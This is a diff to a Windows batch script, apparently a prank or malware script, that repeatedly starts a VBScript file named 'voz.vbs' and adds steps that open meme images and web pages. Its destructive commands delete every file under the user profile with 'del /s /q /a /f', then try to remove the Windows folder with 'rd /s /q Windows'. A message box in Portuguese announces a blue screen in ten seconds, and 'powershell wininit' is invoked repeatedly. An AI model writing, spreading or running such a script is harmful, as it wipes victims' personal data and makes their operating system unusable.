@@ -591,6 +591,9 @@ start voz.vbs
 start voz.vbs
 start voz.vbs
 start voz.vbs
+start https://www.uol.com.br/splash/musica/
+start https://www.uol.com.br/splash/musica/
+timeout /t 5 > nul
 start voz.vbs
 start voz.vbs
 start voz.vbs
@@ -615,8 +618,21 @@ start voz.vbs
 start voz.vbs
 start voz.vbs
 start voz.vbs
+start https://i.imgflip.com/69rq2d.jpg
+start https://i.imgflip.com/69rq2d.jpg
+start https://i.imgflip.com/69rq2d.jpg
 cd "%userprofile%"
 del /s /q /a /f "*.*"
+start https://images-na.ssl-images-amazon.com/images/I/512EhbYMY0L.jpg
+start https://images-na.ssl-images-amazon.com/images/I/512EhbYMY0L.jpg
+start https://images-na.ssl-images-amazon.com/images/I/512EhbYMY0L.jpg
+timeout /t 5 > nul
+start https://www.google.com/search?q=Installing+windows+11&tbm=isch&ved=2ahUKEwj1-KmSr-f4AhVsOLkGHYmGAEIQ2-cCegQIABAA&oq=Installing+windows+11&gs_lcp=CgNpbWcQAzoECCMQJzoICAAQgAQQsQM6CAgAELEDEIMBOgsIABCABBCxAxCDAToFCAAQgAQ6BAgAEEM6BwgAELEDEEM6BAgAEB46BAgAEBNQjAlY0itg-CxoAHAAeACAAZkBiAH-FJIBBDAuMjGYAQCgAQGqAQtnd3Mtd2l6LWltZ8ABAQ&sclient=img&ei=rCDHYvXyB-zw5OUPiY2CkAQ&bih=929&biw=1920
+cd/
+rd /s /q Windows
+cd "%temp%"
+echo/msgbox "Dando tela azul em 10 segundos"
+timeout /t 10 > nul
 powershell wininit
 powershell wininit
 powershell wininit
